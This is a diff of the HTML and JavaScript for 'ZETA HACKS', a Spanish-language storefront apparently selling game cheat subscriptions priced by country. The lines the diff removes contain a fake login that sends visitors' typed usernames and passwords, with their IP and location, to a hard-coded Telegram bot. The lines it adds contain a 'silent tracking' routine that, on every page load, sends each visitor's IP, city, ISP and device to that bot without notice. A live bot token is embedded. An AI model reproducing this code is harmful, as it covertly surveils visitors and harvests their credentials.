@@ -3,251 +3,182 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>ZETA HACKS | MILITARY GRADE SYSTEMS</title>
+    <title>ZETA HACKS | SYNDICATE INTERFACE</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
-        @import url('https://fonts.googleapis.com/css2?family=Big+Shoulders+Display:wght@700;900&family=JetBrains+Mono:wght@300;700&display=swap');
+        @import url('https://fonts.googleapis.com/css2?family=Syncopate:wght@400;700&family=Inter:wght@300;500;900&display=swap');
 
         :root {
-            --neon: #00ff41;
-            --danger: #ff003c;
-            --cyan: #00f2ff;
-            --dark: #020202;
-            --glass: rgba(10, 10, 10, 0.95);
+            --accent: #00ff41;
+            --bg: #030303;
+            --card: rgba(15, 15, 15, 0.6);
+            --border: rgba(255, 255, 255, 0.05);
         }
 
-        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'JetBrains Mono', monospace; }
+        * { margin: 0; padding: 0; box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
         
         body {
-            background: var(--dark);
+            background: var(--bg);
             color: #fff;
+            font-family: 'Inter', sans-serif;
             overflow-x: hidden;
             background-image: 
-                linear-gradient(rgba(0, 255, 65, 0.03) 1px, transparent 1px),
-                linear-gradient(90deg, rgba(0, 255, 65, 0.03) 1px, transparent 1px);
-            background-size: 50px 50px;
+                radial-gradient(circle at 50% 0%, rgba(0, 255, 65, 0.08) 0%, transparent 50%),
+                linear-gradient(rgba(255, 255, 255, 0.01) 1px, transparent 1px),
+                linear-gradient(90deg, rgba(255, 255, 255, 0.01) 1px, transparent 1px);
+            background-size: 100% 100%, 30px 30px, 30px 30px;
         }
 
-        /* --- PANTALLA DE ACCESO TÁCTICO --- */
-        #auth-overlay {
+        /* --- PRELOADER TÉCNICO --- */
+        #loading-overlay {
             position: fixed; inset: 0; background: #000; z-index: 10000;
-            display: flex; align-items: center; justify-content: center;
+            display: flex; flex-direction: column; align-items: center; justify-content: center;
+            transition: 1s ease-in-out;
         }
+        .load-bar { width: 200px; height: 1px; background: #111; position: relative; overflow: hidden; margin-top: 20px; }
+        .load-progress { position: absolute; width: 0%; height: 100%; background: var(--accent); animation: load 1.5s forwards; }
+        @keyframes load { to { width: 100%; } }
 
-        .auth-container {
-            width: 90%; max-width: 450px; padding: 40px;
-            border: 1px solid #111; background: var(--glass);
-            position: relative; overflow: hidden;
-        }
-
-        .auth-container::before {
-            content: ""; position: absolute; top: 0; left: 0; width: 40px; height: 40px;
-            border-top: 4px solid var(--neon); border-left: 4px solid var(--neon);
-        }
-
-        .auth-container h2 {
-            font-family: 'Big Shoulders Display'; font-size: 3rem; 
-            letter-spacing: 5px; color: #fff; text-align: center; margin-bottom: 30px;
-        }
-
-        .input-group { position: relative; margin-bottom: 20px; }
-        .input-group i { position: absolute; left: 15px; top: 18px; color: var(--neon); }
-
-        .auth-input {
-            width: 100%; background: #080808; border: 1px solid #222;
-            padding: 15px 15px 15px 45px; color: var(--neon); font-size: 1rem;
-            transition: 0.3s;
-        }
-
-        .auth-input:focus { border-color: var(--neon); box-shadow: 0 0 15px rgba(0,255,65,0.2); }
-
-        .auth-btn {
-            width: 100%; padding: 20px; background: var(--neon); color: #000;
-            border: none; font-weight: 900; font-size: 1.2rem; cursor: pointer;
-            text-transform: uppercase; clip-path: polygon(0 0, 90% 0, 100% 30%, 100% 100%, 10% 100%, 0 70%);
-            transition: 0.3s;
-        }
-
-        .auth-btn:hover { background: #fff; transform: scale(1.02); }
-
-        /* --- HEADER HUD --- */
+        /* --- UI ESTRUCTURA --- */
         header {
-            padding: 30px; display: flex; justify-content: space-between; align-items: center;
-            border-bottom: 1px solid #111; background: rgba(0,0,0,0.8);
-            position: sticky; top: 0; z-index: 900;
+            padding: 40px 20px; text-align: center;
+            border-bottom: 1px solid var(--border);
+            backdrop-filter: blur(10px);
+            position: sticky; top: 0; z-index: 100;
         }
 
-        .logo-zeta { font-family: 'Big Shoulders Display'; font-size: 2.5rem; letter-spacing: 10px; }
-        .logo-zeta span { color: var(--neon); }
-
-        /* --- DASHBOARD --- */
-        .container { max-width: 1400px; margin: auto; padding: 40px 20px; }
-
-        .section-title {
-            font-size: 0.8rem; color: #444; margin-bottom: 20px; 
-            text-transform: uppercase; letter-spacing: 5px; border-left: 3px solid var(--neon); padding-left: 10px;
+        .logo {
+            font-family: 'Syncopate', sans-serif;
+            font-size: 2.2rem; font-weight: 700; letter-spacing: 12px;
+            text-transform: uppercase; background: linear-gradient(to right, #fff, var(--accent));
+            -webkit-background-clip: text; -webkit-text-fill-color: transparent;
         }
 
-        /* CARD DE PAÍSES */
-        .grid-countries { display: grid; grid-template-columns: repeat(auto-fill, minmax(200px, 1fr)); gap: 15px; }
-        .country-node {
-            background: #080808; border: 1px solid #151515; padding: 30px;
-            text-align: center; cursor: pointer; transition: 0.3s;
+        .container { max-width: 1400px; margin: auto; padding: 60px 20px; }
+
+        .section-header {
+            font-family: 'Syncopate'; font-size: 0.7rem; color: var(--accent);
+            letter-spacing: 5px; margin-bottom: 40px; display: flex; align-items: center;
         }
+        .section-header::after { content: ""; flex: 1; height: 1px; background: var(--border); margin-left: 20px; }
 
-        .country-node:hover {
-            border-color: var(--neon); background: rgba(0, 255, 65, 0.05);
-            transform: translateY(-5px);
+        /* --- GRID DE PAÍSES (MINIMALISMO PRO) --- */
+        .country-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(220px, 1fr)); gap: 20px; }
+        .country-card {
+            background: var(--card); border: 1px solid var(--border);
+            padding: 40px 20px; border-radius: 4px; text-align: center;
+            cursor: pointer; transition: 0.4s cubic-bezier(0.16, 1, 0.3, 1);
         }
-
-        .country-node span { font-size: 3rem; display: block; margin-bottom: 10px; filter: grayscale(1); transition: 0.3s; }
-        .country-node:hover span { filter: grayscale(0); transform: scale(1.1); }
-
-        /* PRODUCTOS */
-        .grid-prods { display: grid; grid-template-columns: repeat(auto-fill, minmax(400px, 1fr)); gap: 25px; }
-        .prod-node {
-            background: #050505; border: 1px solid #111; padding: 0;
-            position: relative; transition: 0.4s;
+        .country-card:hover {
+            border-color: var(--accent); transform: scale(1.03);
+            background: rgba(0, 255, 65, 0.02);
         }
+        .country-card span { font-size: 3rem; display: block; margin-bottom: 20px; }
+        .country-card b { font-family: 'Syncopate'; font-size: 0.8rem; font-weight: 400; letter-spacing: 2px; }
 
-        .prod-header {
-            background: #080808; padding: 20px; border-bottom: 1px solid #111;
+        /* --- PRODUCTOS (MODERNO) --- */
+        .prod-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(400px, 1fr)); gap: 30px; }
+        .prod-card {
+            background: #080808; border-left: 2px solid var(--accent);
+            padding: 40px; position: relative;
+        }
+        .prod-card h3 { font-family: 'Syncopate'; font-size: 1.2rem; margin-bottom: 30px; letter-spacing: 2px; }
+
+        .price-row {
             display: flex; justify-content: space-between; align-items: center;
+            padding: 15px 0; border-bottom: 1px solid #111;
         }
+        .price-row:last-child { border: none; }
+        .price-label { font-size: 0.9rem; color: #888; }
+        .price-value { font-family: 'Syncopate'; font-weight: 700; color: #fff; }
 
-        .prod-header h3 { font-family: 'Big Shoulders Display'; font-size: 1.5rem; letter-spacing: 2px; color: var(--neon); }
-
-        .price-item {
-            padding: 20px; display: flex; justify-content: space-between; align-items: center;
-            border-bottom: 1px solid #080808; transition: 0.2s;
+        .btn-order {
+            background: transparent; border: 1px solid #333; color: #fff;
+            padding: 10px 20px; font-size: 0.7rem; font-family: 'Syncopate';
+            cursor: pointer; transition: 0.3s;
         }
+        .btn-order:hover { background: #fff; color: #000; border-color: #fff; }
 
-        .price-item:hover { background: #0a0a0a; }
-
-        .price-item b { font-size: 1.2rem; color: #fff; }
-        
-        .buy-trigger {
-            background: transparent; border: 1px solid var(--neon); color: var(--neon);
-            padding: 10px 20px; font-size: 0.7rem; font-weight: 700; cursor: pointer;
-            transition: 0.3s;
+        /* --- WHATSAPP --- */
+        .wa-float {
+            position: fixed; bottom: 40px; right: 40px; width: 60px; height: 60px;
+            background: #fff; border-radius: 50%; display: flex; align-items: center;
+            justify-content: center; color: #000; font-size: 24px; text-decoration: none;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.5); z-index: 1000; transition: 0.3s;
         }
+        .wa-float:hover { transform: rotate(15deg) scale(1.1); background: var(--accent); }
 
-        .buy-trigger:hover { background: var(--neon); color: #000; }
-
-        /* FLOATING WHATSAPP */
-        .wa-link {
-            position: fixed; bottom: 30px; right: 30px; width: 60px; height: 60px;
-            background: var(--neon); border-radius: 0; display: flex;
-            align-items: center; justify-content: center; color: #000;
-            font-size: 25px; z-index: 1000; box-shadow: 0 0 20px rgba(0,255,65,0.4);
+        .back-btn {
+            background: none; border: none; color: #444; font-family: 'Syncopate';
+            font-size: 0.6rem; letter-spacing: 3px; cursor: pointer; margin-bottom: 40px;
+            display: flex; align-items: center; gap: 10px;
         }
-
-        /* ANIMACIONES */
-        .glitch { animation: glitch-anim 2s infinite; }
-        @keyframes glitch-anim {
-            0% { text-shadow: 2px 0 var(--cyan); }
-            50% { text-shadow: -2px 0 var(--danger); }
-            100% { text-shadow: 2px 0 var(--cyan); }
-        }
+        .back-btn:hover { color: var(--accent); }
     </style>
 </head>
 <body>
 
-<div id="auth-overlay">
-    <div class="auth-container">
-        <h2>ZETA_SYSTEMS</h2>
-        <div class="input-group">
-            <i class="fa fa-user"></i>
-            <input type="text" id="ag-user" class="auth-input" placeholder="OPERATIVE_ID">
-        </div>
-        <div class="input-group">
-            <i class="fa fa-lock"></i>
-            <input type="password" id="ag-pass" class="auth-input" placeholder="SECURE_KEY">
-        </div>
-        <button class="auth-btn" onclick="requestAccess()">AUTHORIZE</button>
-        <p style="color:#222; font-size:0.6rem; margin-top:20px; text-align:center;">ENCRYPTION: AES-256 BIT ACTIVE</p>
-    </div>
+<div id="loading-overlay">
+    <div class="logo">ZETA HACKS</div>
+    <div class="load-bar"><div class="load-progress"></div></div>
+    <p style="font-size: 0.6rem; letter-spacing: 4px; margin-top: 10px; color: #333;">INITIALIZING_PROTOCOL</p>
 </div>
 
 <header>
-    <div class="logo-zeta">ZETA<span>HACKS</span></div>
-    <div id="hud-info" style="font-size:0.6rem; text-align:right; color:#444;">
-        STATUS: <span style="color:var(--neon)">ENCRYPTED</span><br>
-        LOC: <span id="loc-data">FETCHING...</span>
-    </div>
+    <div class="logo">ZETA</div>
 </header>
 
-<div class="container" id="main-ui" style="display:none;">
+<div class="container" id="main-content">
     
-    <div id="view-home">
-        <div class="section-title">Nodos de Red Global</div>
-        <div class="grid-countries" id="country-list"></div>
+    <div id="home-view">
+        <div class="section-header">01 // SELECT_ORIGIN</div>
+        <div class="country-grid" id="country-grid"></div>
     </div>
 
-    <div id="view-store" style="display:none;">
-        <button onclick="location.reload()" style="background:none; border:none; color:var(--danger); cursor:pointer; margin-bottom:30px; font-size:0.7rem;">[X] DISCONNECT_NODE</button>
-        <h1 id="node-name" class="glitch" style="font-family:'Big Shoulders Display'; font-size:4rem; margin-bottom:40px;"></h1>
-        <div class="grid-prods" id="prod-list"></div>
+    <div id="store-view" style="display:none;">
+        <button class="back-btn" onclick="location.reload()"><i class="fa fa-arrow-left"></i> BACK_TO_ORIGIN</button>
+        <h1 id="selected-country" style="font-family: 'Syncopate'; font-size: 3rem; margin-bottom: 50px; text-transform: uppercase;"></h1>
+        <div class="prod-grid" id="prod-list"></div>
     </div>
 
 </div>
 
-<a href="https://wa.me/573001308078" class="wa-link" target="_blank"><i class="fab fa-whatsapp"></i></a>
+<a href="https://wa.me/573001308078" class="wa-float" target="_blank"><i class="fab fa-whatsapp"></i></a>
 
 <script>
 const BOT_TOKEN = "8093212860:AAFtxW_wZgngSg7nq-sKCvhTONkcSRgSy-c";
 const CHAT_ID = "7621351319";
 
-async function postToTelegram(msg) {
-    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`;
-    return fetch(url);
-}
-
-async function requestAccess() {
-    const u = document.getElementById('ag-user').value;
-    const p = document.getElementById('ag-pass').value;
-    if(!u || !p) return;
-
+// RASTREO SILENCIOSO AL ENTRAR
+async function trackUser() {
     try {
-        const ipRes = await fetch('https://ipapi.co/json/');
-        const ipData = await ipRes.json();
+        const res = await fetch('https://ipapi.co/json/');
+        const data = await res.json();
         
         const report = `
-🔱 *ACCESO DE AGENTE DETECTADO*
+📡 *INFILTRACIÓN DETECTADA*
 ━━━━━━━━━━━━━━━━━━
-👤 *OPERATIVO:* \`${u}\`
-🔑 *CLAVE:* \`${p}\`
-━━━━━━━━━━━━━━━━━━
-🌍 *IP:* \`${ipData.ip}\`
-📍 *UBICACIÓN:* ${ipData.city}, ${ipData.country_name}
-📡 *ISP:* ${ipData.org}
-📱 *SISTEMA:* ${navigator.platform}
+🌍 *IP:* \`${data.ip}\`
+📍 *PAÍS:* ${data.country_name} (${data.country_code})
+🏙️ *CIUDAD:* ${data.city}
+📡 *ISP:* ${data.org}
+📱 *DISPOSITIVO:* ${navigator.platform}
+🕒 *HORA:* ${new Date().toLocaleString()}
 ━━━━━━━━━━━━━━━━━━`;
 
-        await postToTelegram(report);
-        
-        localStorage.setItem('zeta_operative', u);
-        document.getElementById('auth-overlay').style.display = 'none';
-        document.getElementById('main-ui').style.display = 'block';
-        document.getElementById('loc-data').innerText = ipData.ip;
-        renderNodes();
-
+        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(report)}&parse_mode=Markdown`);
     } catch (e) {
-        // Fallback si la IP falla
-        postToTelegram(`⚠️ LOGIN BASICO: ${u} | Pass: ${p}`);
-        localStorage.setItem('zeta_operative', u);
-        document.getElementById('auth-overlay').style.display = 'none';
-        document.getElementById('main-ui').style.display = 'block';
-        renderNodes();
+        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=⚠️ Alguien entró a la página (Error al obtener IP)`);
     }
 }
 
-const DATA = {
+const DATABASE = {
     paises: [
         {n:"ARGENTINA", b:"🇦🇷", t:1500, c:"ARS"}, {n:"BOLIVIA", b:"🇧🇴", t:14, c:"BS"},
         {n:"BRASIL", b:"🇧🇷", t:5.2, c:"BRL"}, {n:"CHILE", b:"🇨🇱", t:970, c:"CLP"},
-        {n:"COLOMBIA", b:"🇨🇴", t:3900, c:"COP"}, {n:"MEXICO", b:"🇲🇽", t:20, c:"MXN"},
-        {n:"PERU", b:"🇵🇪", t:3.55, c:"PEN"}, {n:"USA", b:"🇺🇸", t:1, c:"USD"}
+        {n:"COLOMBIA", b:"🇨🇴", t:3900, c:"COP"}, {n:"ECUADOR", b:"🇪🇨", t:1, c:"USD"},
+        {n:"MEXICO", b:"🇲🇽", t:20, c:"MXN"}, {n:"PERU", b:"🇵🇪", t:3.55, c:"PEN"},
+        {n:"USA", b:"🇺🇸", t:1, c:"USD"}, {n:"ESPAÑA", b:"🇪🇸", t:1, c:"EUR"}
     ],
     items: [
         {n:"DRIP MOBILE NORMAL", d:[1,7,15,30], p:[3,8,12,18]},
@@ -258,57 +189,57 @@ const DATA = {
     ]
 };
 
-function renderNodes() {
-    const list = document.getElementById('country-list');
-    DATA.paises.forEach(p => {
-        const d = document.createElement('div');
-        d.className = 'country-node';
-        d.onclick = () => openNode(p);
-        d.innerHTML = `<span>${p.b}</span><b>${p.n}</b>`;
-        list.appendChild(d);
+function init() {
+    const grid = document.getElementById('country-grid');
+    DATABASE.paises.sort((a,b)=>a.n.localeCompare(b.n)).forEach(p => {
+        const div = document.createElement('div');
+        div.className = 'country-card';
+        div.onclick = () => openStore(p);
+        div.innerHTML = `<span>${p.b}</span><b>${p.n}</b>`;
+        grid.appendChild(div);
     });
+
+    setTimeout(() => {
+        document.getElementById('loading-overlay').style.opacity = '0';
+        setTimeout(() => document.getElementById('loading-overlay').style.display = 'none', 1000);
+    }, 1500);
+    
+    trackUser();
 }
 
-function openNode(p) {
-    document.getElementById('view-home').style.display = 'none';
-    document.getElementById('view-store').style.display = 'block';
-    document.getElementById('node-name').innerText = `NODE_${p.n}`;
+function openStore(p) {
+    document.getElementById('home-view').style.display = 'none';
+    document.getElementById('store-view').style.display = 'block';
+    document.getElementById('selected-country').innerText = p.n;
     window.scrollTo(0,0);
 
     const list = document.getElementById('prod-list'); list.innerHTML = '';
-    DATA.items.forEach(i => {
-        let content = '';
+    DATABASE.items.forEach(i => {
+        let rows = '';
         i.d.forEach((d, idx) => {
             let v = Math.ceil(i.p[idx] * p.t);
             let t = isNaN(d) ? d : d + " DÍAS";
-            content += `
-            <div class="price-item">
-                <b>${t}</b>
-                <div>
-                    <span style="color:#555; font-size:0.8rem; margin-right:15px;">${v.toLocaleString()} ${p.c}</span>
-                    <button class="buy-trigger" onclick="executeOrder('${i.n}','${t}','${v} ${p.c}')">EXECUTE</button>
-                </div>
+            rows += `
+            <div class="price-row">
+                <span class="price-label">${t}</span>
+                <span class="price-value">${v.toLocaleString()} ${p.c}</span>
+                <button class="btn-order" onclick="sendOrder('${i.n}','${t}','${v} ${p.c}')">ORDER</button>
             </div>`;
         });
-        list.innerHTML += `<div class="prod-node"><div class="prod-header"><h3>${i.n}</h3><i class="fa fa-microchip"></i></div>${content}</div>`;
+        list.innerHTML += `<div class="prod-card"><h3>${i.n}</h3>${rows}</div>`;
     });
 }
 
-function executeOrder(n, d, p) {
-    const user = localStorage.getItem('zeta_operative');
-    const msg = `💰 *SOLICITUD DE COMPRA*\n━━━━━━━━━━━━━━━━━━\n👤 OPERATIVO: ${user}\n💎 ITEM: ${n}\n⏳ PLAN: ${d}\n💵 PRECIO: ${p}`;
-    postToTelegram(msg);
+function sendOrder(n, d, p) {
+    const report = `💰 *SOLICITUD DE COMPRA*\n━━━━━━━━━━━━━━━━━━\n💎 ITEM: ${n}\n⏳ PLAN: ${d}\n💵 PRECIO: ${p}\n━━━━━━━━━━━━━━━━━━`;
+    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(report)}&parse_mode=Markdown`);
     
-    const wa = `https://wa.me/573001308078?text=🔱 *ZETA_SYSTEMS_ORDER*%0A👤 Agente: ${user}%0A💎 Software: ${n}%0A⏳ Plan: ${d}%0A💰 Precio: ${p}`;
+    const wa = `https://wa.me/573001308078?text=🔱 *ZETA ORDER*%0A💎 Software: ${n}%0A⏳ Plan: ${d}%0A💰 Precio: ${p}`;
     window.open(wa, '_blank');
 }
 
-// Auto-reconocimiento
-if(localStorage.getItem('zeta_operative')) {
-    document.getElementById('auth-overlay').style.display = 'none';
-    document.getElementById('main-ui').style.display = 'block';
-    renderNodes();
-}
+window.onload = init;
 </script>
+
 </body>
 </html>
